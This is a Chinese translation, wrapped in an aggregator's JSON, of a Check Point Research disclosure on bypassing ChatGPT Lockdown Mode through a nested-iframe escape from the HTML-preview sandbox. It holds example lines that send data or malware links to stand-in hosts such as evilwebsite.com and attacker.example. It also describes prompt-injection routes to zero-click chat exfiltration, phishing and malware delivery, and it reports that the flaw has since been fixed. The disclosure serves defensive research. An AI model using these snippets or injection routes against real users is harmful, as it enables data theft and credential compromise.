[{"_1":2,"_3":4},"root",{"_5":131},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":46,"_47":48,"_49":50,"_51":52,"_53":54,"_55":37,"_56":37,"_57":58,"_59":37,"_60":61},"expiresAt",1794185100000,"id","aeb809z3vyorh7x5j0588tlw3","title","Check Point Research 揭示 ChatGPT Lockdown Mode 绕过漏洞","originalTitle","ChatGPT Lockdown Mode Bypass: Phishing, Malware Delivery, and Silent Data Exfiltration","summary","Check Point Research 发现 ChatGPT HTML 页面预览的沙箱绕过漏洞，可绕过 Lockdown Mode 窃取完整聊天历史与上传文件，并通过伪造窗口投递恶意软件或窃取凭据。","reason","文章拆解了嵌套 iframe 沙箱权限绕过链条，并展示零点击数据外传、凭据窃取与恶意软件投递场景。","source",{"_77":130},"links",{"_120":129},"publishedAt","2026-11-05T14:00:11.000Z","discoveredAt","2026-11-05T22:03:22.710Z","timelineAt","category","disclosure","tags",[124,125,78,126,127,128,90],"score",72,"selected",true,"channel","news","story",{"_92":93,"_13":94},"x","readingMode","full","author","stcpresearch","body",{"_61":119,"_120":-5,"_121":122,"_123":37},"outline",[95,96,97,98,99,100,101],"relatedStories",[91],"topics",[68,69,70,71,72,73,74],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation","bodyLanguage","zh","factId","f7CVn9o5NS4A","reportCount",2,"additionalSourceCount",1,{"_75":89,"_77":90},{"_75":87,"_77":88},{"_75":85,"_77":86},{"_75":83,"_77":84},{"_75":81,"_77":82},{"_75":79,"_77":80},{"_75":76,"_77":78},"slug","ai-security","name","AI 安全","research","技术研究","vuln","漏洞披露","ai-agent","AI Agent 安全","black-market","数据窃取与黑产","ransomware","勒索软件","checkpoint","Check Point",{"_92":93,"_13":94},"publicId","2d51e7a9-e044-4f1c-978b-020090d79fb6","ChatGPT锁定模式沙箱绕过漏洞已修复",{"_11":117,"_103":118,"_105":65},{"_11":115,"_103":116,"_105":65},{"_11":113,"_103":114,"_105":65},{"_11":111,"_103":112,"_105":65},{"_11":108,"_103":109,"_105":110},{"_11":106,"_103":107,"_105":65},{"_11":102,"_103":104,"_105":65},"sec-7","text","结论","level","sec-6","ChatGPT Classic 中的零点击利用","sec-5","通过伪造应用程序窗口投递恶意软件",3,"sec-4","攻击面：在可信界面中进行数据外泄、网络钓鱼和恶意软件下载。","sec-3","技术细节","sec-2","简介","sec-1","主要要点","<p>研究作者：<strong>Alexey Bukhteyev</strong></p><h2 id=\"sec-1\">主要要点</h2><ul>\n<li>OpenAI 最近推出了 Lockdown Mode，这是一项可选的高级安全设置，旨在保护敏感用户数据，抵御基于提示注入的数据外泄攻击。</li>\n\n\n\n<li>Check Point Research 发现了一个允许攻击者绕过 Lockdown Mode 的漏洞，使其核心防护措施形同虚设。</li>\n\n\n\n<li>该漏洞暴露了大范围攻击面，使攻击者能够静默外泄完整聊天历史、通过网络钓鱼窃取凭据以及投递恶意软件。</li>\n\n\n\n<li>在 ChatGPT Classic 中，该攻击无需任何用户交互：只需进行对话即可触发静默数据外泄。</li>\n</ul><h2 id=\"sec-2\">简介</h2><p>今年早些时候，Check Point Research 披露了<a href=\"https://research.checkpoint.com/2026/chatgpt-data-leakage-via-a-hidden-outbound-channel-in-the-code-execution-runtime/\">ChatGPT 代码执行运行时中的安全漏洞</a>，攻击者可通过 DNS 隧道将敏感对话数据静默外泄至其控制的服务器。DNS 隧道是一种隐藏的出站通信渠道，可绕过运行时的网络隔离。该问题的修复已迅速部署。</p><p>此外，OpenAI 后来还引入了一项新的安全功能：<a href=\"https://openai.com/index/introducing-lockdown-mode-and-elevated-risk-labels-in-chatgpt/\">Lockdown Mode</a>。</p><p>Lockdown Mode 是面向已登录 ChatGPT 用户的一项可选高级安全设置，旨在降低提示注入攻击通过促使 ChatGPT 或其某个工具发起出站网页、应用、连接器或文件下载请求来外泄敏感数据的风险。<a href=\"https://openai.com/index/ai-agent-link-safety/\">OpenAI 关于 URL 安全性的官方文章</a>中描述了一个经典示例：攻击者诱使 AI 加载类似 <code>attacker.example/collect?data=&lt;private data&gt;</code> 的链接——即使聊天中从未出现任何可疑内容，私密数据最终也会进入攻击者的服务器日志。</p><p>鉴于即使实施了防护措施，提示注入仍然是持续存在的风险，Lockdown Mode 通过切断数据可能离开对话的通道来缓解这一风险。启用后，它会将实时网页访问限制为缓存内容，阻止加载和显示互联网图片，禁用由 Canvas 生成的代码发起网络请求，并关闭 Deep Research、Agent Mode、实时连接器和文件下载。</p><figure><img width=\"745\" height=\"121\" src=\"/dailyinfo/media/26be29c0258125c3.webp\" srcset=\"/dailyinfo/media/4c0c6fc11ba896ce.webp 720w, /dailyinfo/media/840ec57046b58e27.webp 1200w, /dailyinfo/media/26be29c0258125c3.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 1——Canvas 尝试访问外部资源时显示的 ChatGPT Lockdown Mode 通知。</figcaption></figure><p>我们发现了 ChatGPT 中的一个漏洞，攻击者能够绕过 Lockdown Mode，并将聊天数据隐蔽地外泄至外部服务器。</p><figure><video height=\"1620\" width=\"2880\" controls=\"\" src=\"https://research.checkpoint.com/wp-content/uploads/2026/10/1-noclick-leakage-lockdown-mode.mp4\" playsinline=\"\" preload=\"none\"></video><figcaption>视频 1——在没有任何通知的情况下，完整聊天历史被传输至第三方服务器，同时绕过了 Lockdown Mode。</figcaption></figure><p>涉及该漏洞的潜在攻击场景并不限于聊天数据泄露。该漏洞还允许操纵 ChatGPT Classic 界面，包括显示包含任意内容的弹出窗口，从而为种类繁多的网络钓鱼攻击打开方便之门。</p><p>该攻击可以通过多种方式实施：恶意提示、恶意 GPT 或共享聊天。</p><p>以下章节介绍了该漏洞背后的技术细节，并逐步讲解可能的漏洞利用场景。</p><h2 id=\"sec-3\">技术细节</h2><p>2026 年 2 月，OpenAI 在 ChatGPT 代码块中加入了<a href=\"https://x.com/OpenAIDevs/status/2024600394299822096\">HTML 页面预览</a>功能。其外观如下：</p><figure><img width=\"763\" height=\"634\" src=\"/dailyinfo/media/9204c6d9971ac5aa.webp\" srcset=\"/dailyinfo/media/e8fbb60700648b23.webp 720w, /dailyinfo/media/68acf812baee7e3a.webp 1200w, /dailyinfo/media/9204c6d9971ac5aa.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 2——ChatGPT 中的 HTML 页面预览。</figcaption></figure><p>当然，由于在 ChatGPT 界面中渲染由用户控制且包含 JavaScript 的 HTML 可能为私密数据外泄开辟直接路径，因此该功能的实现包含多项安全防护措施。</p><p>最明显的攻击场景包括：</p><ul>\n<li>嵌入 URL 中包含聊天数据的外部图片：<br><code>&lt;img src=\"&lt;https://evilwebsite.com/?q=personal_data&gt;\" /&gt;</code> 如果此类图片能够被渲染，攻击者就能触发零点击的私密数据外泄。</li>\n\n\n\n<li>嵌入外部链接：<code>&lt;a href=\"&lt;https://evilwebsite.com/malware.exe&gt;\"&gt;Download ChatGPT update&lt;/a&gt;</code> 这将允许攻击者直接在 ChatGPT 界面内投放具有说服力的社会工程诱饵，并通过共享聊天进行传播。</li>\n\n\n\n<li>打开一个包含任意 URL 的弹出窗口，可以通过带有 <code>target=\"_blank\"</code> 指令的链接实现：<br><code>&lt;a href=\"&lt;https://evilwebsite.com/&gt;\" target=\"_blank\"&gt;Click me&lt;/a&gt;</code> 或通过 JavaScript 实现：<br><code>window.open(\"&lt;https://evilwebsite.com/&gt;\", \"_blank\", \"width=380,height=260\");</code> 这种场景在 ChatGPT Classic 客户端中尤其危险，因为用户可能会认为该弹出窗口属于可信的应用上下文。</li>\n\n\n\n<li>读取 <code>chatgpt.com</code> 的 cookies 或 <code>localStorage</code> 数据。这将造成会话失陷风险。</li>\n</ul><p>这些场景实际上通过多层隔离和运行时强制执行得到了有效缓解。</p><p>渲染后的 HTML 被置于沙箱中，将用户可控内容与 ChatGPT 主应用上下文隔离开来，防止渲染页面直接访问父文档、ChatGPT UI 状态、cookies 或与 <code>chatgpt.com</code> 关联的 <code>localStorage</code>。</p><p>页面尝试向外部资源发送数据，或加载远程图片、脚本、链接，或打开任意外部 URL 的所有行为，都会被沙箱拦截并显示为警告：</p><figure><img width=\"474\" height=\"453\" src=\"/dailyinfo/media/02b6a5cdc0945f80.webp\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 3 – 当渲染后的 HTML 页面尝试访问外部资源，或用户点击外部链接时，ChatGPT 会显示批准对话框。</figcaption></figure><p>沙箱由两个嵌套的 iframe 实现。查看其实现可以看到，沙箱并未限制 iframe 中的某些操作。例如，<code><code>allow-popups</code></code> 和 <code><code>allow-popups-to-escape-sandbox</code></code> 权限已启用。</p><figure><img width=\"1024\" height=\"465\" src=\"/dailyinfo/media/56efc8ba445fe236.webp\" srcset=\"/dailyinfo/media/f5bb8255d9ccea95.webp 720w, /dailyinfo/media/9eff1a15a6401cc5.webp 1200w, /dailyinfo/media/56efc8ba445fe236.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 4 – HTML 预览 iframe 的 sandbox 属性，显示了宽松的弹出窗口 token（高亮显示）。</figcaption></figure><p>弹出窗口采用了另一种控制方式。沙箱脚本重新定义了 <code>window.open</code> 函数：</p><pre>window.open: h=&gt;{if(!h)return null;const{location:f}=r;return an(o,f,h),null}\n</pre><p>得益于这一点，当显示在 <code>iframe</code> 中的网页尝试打开弹出窗口时，ChatGPT 不会允许该操作，必须先经用户批准。当页面尝试使用空 URL 或 <code>about:blank</code> 打开弹出窗口时，该函数只会返回 <code>null</code>，用户甚至不会看到任何通知。</p><p>然而，由于 <code>iframe</code> 沙箱包含 <code>allow-popups</code> token，因此并未显式限制弹出窗口。</p><p>因此，如果我们能够获得真正的 <code>window.open</code> 函数，就能够打开弹出窗口，绕过 HTML 沙箱限制，甚至绕过 Lockdown Mode。事实上，我们可以在沙箱页面内再创建一个嵌套的 <code>iframe</code>，并使用其 <code>contentWindow.open</code> 函数：</p><pre>window.open(\"about:blank\"); // blocked\n\n// creating a nested iframe\nvar f = document.createElement('iframe');\ndocument.body.appendChild(f);\n\nf.contentWindow.open(\"about:blank\"); // works\n</pre><p>此外，在成功打开弹出窗口后，攻击者可以在其中放入任意 HTML 代码。由于存在 <code>allow-popups-to-escape-sandbox</code> token，这些代码将不再在沙箱中执行。</p><h2 id=\"sec-4\">攻击面：在可信界面中进行数据外泄、网络钓鱼和恶意软件下载。</h2><p>该漏洞打开了广泛的攻击面。它可用于秘密窃取完整的聊天记录和上传的文件、分发伪装成合法更新的恶意软件，甚至窃取凭据。下面，我们将介绍几种场景并解释其工作原理。</p><h3 id=\"sec-5\">通过伪造应用程序窗口投递恶意软件</h3><p>通常，浏览器的默认设置会阻止 JavaScript 打开弹出窗口。打开新窗口通常需要用户执行明确操作，例如点击链接或按钮。</p><p>攻击者需要制作一个看似合理的诱饵，诱骗用户点击生成的预览。由于攻击者控制所生成页面的内容，因此很容易打造出令人信服的诱饵。打开的窗口会保留 ChatGPT 应用程序的图标，而标题由攻击者控制，从而使用户产生仍在与 ChatGPT 应用程序交互的错觉。例如，这可以用来诱骗用户下载伪装成应用程序更新的恶意软件。ChatGPT Classic 应用不允许自动下载文件，因此要下载文件，用户还必须点击相应链接。</p><figure><video height=\"1620\" width=\"2880\" controls=\"\" src=\"https://research.checkpoint.com/wp-content/uploads/2026/10/3-file-download-in-app.mp4\" playsinline=\"\" preload=\"none\"></video><figcaption>视频 2——通过伪造的 ChatGPT 窗口投递恶意软件。</figcaption></figure><p>在浏览器中实施这一场景更加容易，因为自动下载不会被阻止。此外，受害者甚至无需拥有账户，攻击者只需分享一段包含恶意页面的聊天记录，因此点击共享聊天中的任何内容都可能造成危险：</p><figure><video height=\"1620\" width=\"2880\" controls=\"\" src=\"https://research.checkpoint.com/wp-content/uploads/2026/10/4-demo-file-donwload-shared-chat.mp4\" playsinline=\"\" preload=\"none\"></video><figcaption>视频 3——通过共享聊天投递恶意软件。</figcaption></figure><h2 id=\"sec-6\">ChatGPT Classic 中的零点击利用</h2><p>我们发现，基于 Electron 的 ChatGPT Classic 应用程序中的 <code>window.open</code> 即使没有用户手势也能运行。这使得该漏洞的危险性显著提高：攻击者可以悄无声息地外泄数据，无需用户进行任何交互，仅仅进行对话就足以触发攻击。<strong>视频 1</strong>演示了这一点，其中恶意 GPT 会悄悄将聊天消息泄露给攻击者控制的服务器。</p><p>除此之外，我们还发现，可以重新加载 ChatGPT 主应用程序窗口中的内容，并代表用户执行某些操作，例如强行将其登出账户。这可以让攻击者打造一个看似合理的诱饵，诱骗用户在攻击者控制的页面上重新进行身份验证，从而悄悄窃取其凭据。</p><figure><video height=\"1620\" width=\"2880\" controls=\"\" src=\"https://research.checkpoint.com/wp-content/uploads/2026/10/2-password-phishing-1.mp4\" playsinline=\"\" preload=\"none\"></video><figcaption>视频 4——凭据窃取。</figcaption></figure><h2 id=\"sec-7\"><strong>结论</strong></h2><p>Check Point Research 已负责任地向 OpenAI 披露此漏洞。2026 年 9 月 18 日，OpenAI 告知我们，其已通过从外部 HTML 预览沙箱 iframe 中移除 <code>allow-popups</code> 和 <code>allow-popups-to-escape-sandbox</code> 权限部署了修复措施。随后我们重新测试了该问题，并确认本文所述的漏洞利用技术已不再奏效。</p><p>随着 AI 助手逐步演变为完整的执行环境，在云端运行代码、在客户端渲染内容，同时处理医疗记录、财务数据及其他高度敏感的信息，每一项新能力都会扩大攻击面，包括那些纯粹为便利性而构建的功能。</p><p>AI 代理和应用程序的防护栏及内置安全功能有助于缓解威胁，但仍无法提供绝对的安全保证。在委托 AI 处理敏感信息或授予其计算机的完整访问权限之前，务必牢记这一点。保护这些系统需要超越单个功能，并将整个平台纳入考量。现代 AI 助手带来的益处巨大，但安全地采用它们需要谨慎关注每一层，包括用户从未想到的层面。</p><p>文章 <a href=\"https://research.checkpoint.com/2026/chatgpt-lockdown-mode-bypass-phishing-malware-delivery-and-silent-data-exfiltration/\">ChatGPT Lockdown Mode Bypass: Phishing, Malware Delivery, and Silent Data Exfiltration</a> 最初发布于 <a href=\"https://research.checkpoint.com/\">Check Point Research</a>。</p>","original","zhKind","translation","complete","漏洞分析","复现","大模型","漏洞利用","数据窃取","https://research.checkpoint.com/2026/chatgpt-lockdown-mode-bypass-phishing-malware-delivery-and-silent-data-exfiltration/","Check Point Research",{"_132":133,"_134":-5},"changelogVersion","2026-10-01T08:00","release"]
